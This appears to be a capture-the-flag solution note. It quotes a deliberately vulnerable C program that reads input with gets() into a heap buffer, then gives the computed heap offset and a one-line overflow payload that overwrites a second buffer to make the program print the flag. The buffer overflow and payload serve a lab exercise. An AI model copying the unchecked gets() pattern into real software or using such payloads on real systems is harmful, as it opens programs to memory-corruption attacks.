# #define _GNU_SOURCE
# #include <stdlib.h>
# #include <stdio.h>
# #include <string.h>
# #include <unistd.h>

# #define SIZE    50
# #define CMD     "/bin/cat /home/basic10/flag"

# int main()
# {
#         char *buff1 = malloc(SIZE);
#         char *buff2 = malloc(SIZE);

#         setresuid(geteuid(), geteuid(), geteuid());

#         if (buff1 == NULL || buff2 == NULL) {
#                 puts("Malloc Fail.");
#                 return 1;
#         }

#         strcpy(buff2, "Bad Job");
#         gets(buff1);
#         free(buff1);

#         if (strcmp(buff2, "Good Job") == 0) {
#                 puts("Nice :)");
#                 system(CMD);
#         } else {
#                 puts("Try again...");
#         }

#         free(buff2);
#         return 0;
# }


malloc1 = 0x8c3e1a0
malloc2 = 0x8c3e1e0
# difference is 64
payload = "a"*64 + "Good Job"